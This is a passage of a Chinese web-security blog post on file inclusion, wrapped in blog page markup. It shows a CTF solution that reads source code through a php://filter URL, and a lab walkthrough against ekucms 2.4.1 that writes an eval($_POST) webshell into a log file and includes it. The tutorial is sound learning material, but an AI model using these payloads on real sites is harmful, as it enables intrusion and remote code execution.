+<p>1、利用伪协议<code>http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/read=convert.base64-encode/resource=index.php</code></p>
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/1672922818_63b6c6c21bbfdec48924c.png!small" alt="图片.png"></p>
+<p>2、利用bash64解密</p>
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/1672922823_63b6c6c7c92bc190aa095.png!small" alt="图片.png"></p>
+<h2 id="10、ekucms-文件包含"><a href="#10、ekucms-文件包含" class="headerlink" title="10、ekucms-文件包含"></a>10、ekucms-文件包含</h2><p>1、在URL中输入<code>http://127.0.0.1/ekucms2.4.1/index.php?s=my/show/id/&#123;~eval($_POST[x])&#125;</code></p>
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/1672922832_63b6c6d016115cf352b23.png!small" alt="图片.png"></p>
+<p>2、虽然出现错误，但是在后台可以看到，日志文件中已经写入了shell</p>
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/1672922839_63b6c6d79427e720fb073.png!small" alt="图片.png"></p>
+<p>3、直接执行phpinfo</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/ekucms2.4.1/index.php?s=my/show/id/\..\temp\logs\22_04_20.log</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/1672922846_63b6c6de75b8d83fdf16c.png!small" alt="图片.png"></p>
+<p>4、直接上菜刀</p>
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/1672922853_63b6c6e50347e1915bf89.png!small" alt="图片.png"></p>
+
+        </div>
+        
+            <div class="kratos-copyright text-center clearfix">
+                <h5>本作品采用 <a rel="license nofollow" target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/">知识共享署名-相同方式共享 4.0 国际许可协议</a> 进行许可</h5>
+            </div>
+        
+        <footer class="kratos-entry-footer clearfix">
+            
+                <div class="post-like-donate text-center clearfix" id="post-like-donate">
+                
+                
+                    <a class="share" href="javascript:;"><i class="fa fa-share-alt"></i> 分享</a>
+                    <div class="share-wrap" style="display: none;">
+    <div class="share-group">
+        <a href="javascript:;" class="share-plain qq" onclick="share('qq');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-qq"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain qzone" onclick="share('qzone');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-star"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weixin pop style-plain" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weixin"></i>
+            </div>
+            <div class="share-int">
+                <div class="qrcode" id="wechat-qr"></div>
+                <p>打开微信“扫一扫”，打开网页后点击屏幕右上角分享按钮</p>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain weibo" onclick="share('weibo');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-weibo"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain facebook style-plain" onclick="share('facebook');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-facebook"></i>
+            </div>
+        </a>
+        <a href="javascript:;" class="share-plain twitter style-plain" onclick="share('twitter');" rel="nofollow">
+            <div class="icon-wrap">
+                <i class="fa fa-twitter"></i>
+            </div>
+        </a>
+    </div>
+    <script type="text/javascript">
+        $(()=>{
+            new QRCode("wechat-qr", {
+                text: "http://example.com/2023/01/19/Web%E5%AE%89%E5%85%A8-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/",
+                width: 150,
+                height: 150,
+                correctLevel : QRCode.CorrectLevel.H
+            });
+        });
+        function share(dest) {
+            const qqBase        = "https://connect.qq.com/widget/shareqq/index.html?";
+            const weiboBase     = "https://service.weibo.com/share/share.php?";
+            const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
+            const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
+            const twitterBase   = "https://twitter.com/intent/tweet?";
+            const hostUrl       = "http://example.com/2023/01/19/Web%E5%AE%89%E5%85%A8-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/";
+            const title         = "「Web安全-文件包含」";
+            const excerpt       = `思维导图
+2、文件包含原理文件包含一般是指源文件可以将另一个文件的全部内容包含进来。
+其一般形式：#include “文件名” 或者 #include&lt;文件名&gt;
+3、文件包含的条件
+用户能够控制这个动态变量
+include...`;
+            let _URL;
+            switch (dest) {
+                case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
+                case "weibo"    : _URL = weiboBase+"url="+hostUrl+"&title="+title+excerpt;                                 break;
+                case "qzone"    : _URL = qzoneBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";  break;
+                case "facebook" : _URL = facebookBase+"u="+hostUrl;                                                        break;
+                case "twitter"  : _URL = twitterBase+"text="+title+excerpt+"&url="+hostUrl;                                break;
+            }
+            window.open(_URL);
+        };
+    </script>
+</div>
+                
+                </div>
+            
+            <div class="footer-tag clearfix">
+                <div class="pull-left">
+                <i class="fa fa-tags"></i>
+                    <a class="tag-none-link" href="/tags/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E6%80%BB%E7%BB%93/" rel="tag">Struts2漏洞复现总结</a>
+                </div>
+                <div class="pull-date">
+                <span>最后编辑：2023-01-19</span>
+                </div>
+            </div>
+        </footer>
+    </div>
+    
+        <nav class="navigation post-navigation clearfix" role="navigation">
+            
+            <div class="nav-previous clearfix">
+                <a title=" clash最新远程代码执行漏洞" href="/2023/01/18/clash最新远程代码执行漏洞/">&lt; 上一篇</a>
+            </div>
+            
+            
+            <div class="nav-next clearfix">
+                <a title=" 等保测评项——弱口令空口令" href="/2023/01/19/等保测评项——弱口令空口令/">下一篇 &gt;</a>
+            </div>
+            
+        </nav>
+    
+    
+        <div id="disqus_thread" class="post-comments lazy-load"></div>
+
+<script>
+    var disqus_config = function () {
+        this.page.url = 'http://example.com/2023/01/19/Web%E5%AE%89%E5%85%A8-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/';  // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = '2023/01/19/Web安全-文件包含/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+    };
+    var load_comm = () => {
+        if (typeof DISQUS == 'undefined') {
+            var d = document, s = d.createElement('script');
+            s.src = 'https://.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        } else {
+            DISQUS.reset({
+                reload: true,
+                config: function () {  
+                    this.page.url = 'http://example.com/2023/01/19/Web%E5%AE%89%E5%85%A8-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/';  // Replace PAGE_URL with your page's canonical URL variable
+                    this.page.identifier = '2023/01/19/Web安全-文件包含/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+                }
+            });
+        }
+    };
+    
+</script>
+<script async id="dsq-count-scr" src="//.disqus.com/count.js"></script>
+
+<noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    
+</article>
+
+        
+
+            </section>
+
+        
+
+                
+            
+
+<section id="kratos-widget-area" class="col-md-4 hidden-xs hidden-sm">
+    <!-- 文章和页面根据splitter来分割，没有的话就从头开始设置为sticky -->
+    
+    
+                <aside id="krw-about" class="widget widget-kratos-about clearfix">
+    <div class="photo-background"></div>
+    <div class="photo-wrapper clearfix">
+        <div class="photo-wrapper-tip text-center">
+            <img class="about-photo" src="/images/touxiang.webp" />
+        </div>
+    </div>
+    <div class="textwidget">
+        <p class="text-center"></p>
+    </div>
+</aside>
+            
+                    <div class="sticky-area">
+                
+                    <aside id="krw-toc" class="widget widget-kratos-toc clearfix">
+    <div class="photo-background"></div>
+    <h4 class="widget-title no-after">
+        <i class="fa fa-compass"></i>
+        文章目录
+        <span class="toc-progress-bar"></span>
+    </h4>
+    <div class="textwidget">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE"><span class="toc-text">思维导图</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%8E%9F%E7%90%86"><span class="toc-text">2、文件包含原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E6%9D%A1%E4%BB%B6"><span class="toc-text">3、文件包含的条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%8D%B1%E5%AE%B3"><span class="toc-text">4、文件包含漏洞的危害</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-text">5、文件包含漏洞修复</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6%E3%80%81%E6%B6%89%E5%8F%8A%E5%8C%85%E5%90%AB%E7%9A%84%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0"><span class="toc-text">6、涉及包含的危险函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7%E3%80%81%E6%A1%88%E4%BE%8B%E6%BC%94%E7%A4%BA-%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB"><span class="toc-text">7、案例演示-本地包含</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#7-1%E3%80%81%E6%97%A0%E9%99%90%E5%88%B6%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-text">7.1、无限制文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-2%E3%80%81%E6%9C%89%E9%99%90%E5%88%B6%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-text">7.2、有限制文件包含</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8%E3%80%81%E6%A1%88%E4%BE%8B%E6%BC%94%E7%A4%BA-%E8%BF%9C%E7%A8%8B%E5%8C%85%E5%90%AB"><span class="toc-text">8、案例演示-远程包含</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#8-1%E3%80%81%E6%9D%A1%E4%BB%B6"><span class="toc-text">8.1、条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-2%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E5%90%84%E7%A7%8D%E5%86%99%E6%B3%95"><span class="toc-text">8.2、文件包含的各种写法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-3%E3%80%81%E5%8D%8F%E8%AE%AE%E7%8E%A9%E6%B3%95"><span class="toc-text">8.3、协议玩法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9%E3%80%81CTF-%E5%8D%97%E9%82%AE%E6%9D%AF"><span class="toc-text">9、CTF-南邮杯</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10%E3%80%81ekucms-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-text">10、ekucms-文件包含</span></a></li></ol>
+    </div>
+</aside>
+                
+                
+  <aside id="krw-categories" class="widget widget-kratos-categories clearfix">
+    <h4 class="widget-title"><i class="fa fa-folder"></i>分类目录</h4>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%B7%A5%E5%85%B7/">工具</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%97%A5%E5%B8%B8/">日常</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a><span class="category-list-count">13</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E/">漏洞</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%93%9D%E9%98%9F/">蓝队</a><span class="category-list-count">1</span></li></ul>
+  </aside>
+
+
+            
+                
+  <aside id="krw-tags" class="widget widget-kratos-tags clearfix">
+    <h4 class="widget-title"><i class="fa fa-tags"></i>标签聚合</h4>
+      <div class="tag-clouds">
+        <a href="/tags/Apache-2-4-49/" style="font-size: 0.6em;">Apache 2.4.49</a> <a href="/tags/Spring-Boot/" style="font-size: 0.6em;">Spring Boot</a> <a href="/tags/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E6%80%BB%E7%BB%93/" style="font-size: 0.8em;">Struts2漏洞复现总结</a> <a href="/tags/iis/" style="font-size: 0.6em;">iis</a> <a href="/tags/log4j/" style="font-size: 0.6em;">log4j</a> <a href="/tags/sql-%E6%B3%A8%E5%85%A5/" style="font-size: 0.6em;">sql 注入</a> <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" style="font-size: 0.6em;">信息收集</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 0.6em;">文件上传</a> <a href="/tags/%E6%BA%AF%E6%BA%90/" style="font-size: 0.6em;">溯源</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/" style="font-size: 0.6em;">漏洞扫描</a>
+      </div>
+  </aside>
+
+            
+                
+  <aside id="krw-posts" class="widget widget-kratos-posts">
+  <h4 class="widget-title"><i class="fa fa-file"></i>最新文章</h4>
+  <div class="tab-content">
+      <ul class="list-group">
+        
+        
+          
+          
+            <a class="list-group-item" href="/2023/01/19/%E7%AD%89%E4%BF%9D%E6%B5%8B%E8%AF%84%E9%A1%B9%E2%80%94%E2%80%94%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%A9%BA%E5%8F%A3%E4%BB%A4/"><i class="fa  fa-book"></i> 等保测评项——弱口令空口令</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2023/01/19/Web%E5%AE%89%E5%85%A8-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"><i class="fa  fa-book"></i> Web安全-文件包含</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2023/01/18/clash%E6%9C%80%E6%96%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"><i class="fa  fa-book"></i> clash最新远程代码执行漏洞</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2023/01/18/%E7%A6%85%E9%81%93%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E4%B8%8E%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88%E9%99%84POC%EF%BC%89/"><i class="fa  fa-book"></i> 禅道系统权限绕过与命令执行漏洞（附POC）~</a>
+            
+          
+        
+          
+          
+            <a class="list-group-item" href="/2023/01/13/%E4%B8%AA%E4%BA%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/"><i class="fa  fa-book"></i> 个人渗透测试常用方法总结</a>
+            
+          
+        
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+          
+            
+      </ul>
+  </div>
+  </aside>
+
+            
+    </div>
+</section>
+        
+        </div>
+    </div>
+</div>
+<footer>
+    <div id="footer"  class="ap-lrc"  >
+        <div class="kr-tool text-center">
+            <div class="tool">
+                
+                    <div class="box search-box">
+                        <a href="/search/">
+                            <span class="fa fa-search"></span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="box theme-box" id="darkmode-switch">
+                        <span class="fa fa-adjust"></span>
+                    </div>
+                
+                
+            </div>
+            <div class="box gotop-box">
+                <span class="fa fa-chevron-up"></span>
+            </div>
+        </div>
+        <div class="container">
+            <div class="row">
+                <div class="col-md-6 col-md-offset-3 footer-list text-center">
+                    <ul class="kratos-social-icons">
+                        
+                        
+                        <li><a target="_blank" rel="nofollow" href="https://t.me/CandyUnion"><i class="fa fa-telegram"></i></a></li>
+                        
+                        
+                        
+                        <li><a target="_blank" rel="me" href="https://nya.one/@zr"><i class="fa fa fa-share-alt-square"></i></a></li>
+                        <li><a target="_blank" rel="nofollow" href="https://github.com/zr-blog"><i class="fa fa-github"></i></a></li>
+                        
+                    </ul>
+                    <ul class="kratos-copyright">
+                        <div>
+                            <li>&copy; 2023 Love is a Moment Story 版权所有.</li>
+                            <li>本站已运行<span id="span_dt">Loading...</span></li>
+                        </div>
+                        <div>
+                            <li>Theme <a href="https://github.com/Candinya/Kratos-Rebirth" target="_blank">Kratos:Rebirth</a></li>
+                            <li>Site built with&nbsp;<i class="fa fa-heart throb" style="color:#d43f57"></i>&nbsp;by zhang rui.</li>
+                        </div>
+                        <div>
+                            <li>Powered by <a href="https://hexo.io" target="_blank" rel="nofollow">Hexo</a></li>
+                            <li>Hosted on <a href="https://zr-blog.github.io/" target="_blank">Github Pages</a></li>
+                        </div>
+                        <div>
+                            
+                            
+                        </div>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+</div>
+</div>
+
+        <script defer src="https://cdn.jsdelivr.net/npm/bootstrap@3.3.4/dist/js/bootstrap.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.js"></script>
+<script>const notMobile = (!(navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)));</script>
+
+
+    <script async src="/js/candy.min.js"></script>
+
+
+
+    <script defer src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script>
+    
+    <script defer src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+    <meting-js
+        server="netease"
+        type="playlist"
+        id="7026505671"
+        order="random"
+        fixed="true"
+    >
+    </meting-js>
+
+
+
+    <script defer src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+<script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script>
+<script defer src="/js/kratosr.min.js"></script>
+<script defer src="/js/pjax.min.js"></script>
+
+
+    <script defer src="/js/kr-dark.min.js"></script>
+
+
+
+<!-- Extra support for third-party plguins  -->
+
+
+    </body>
+</html>
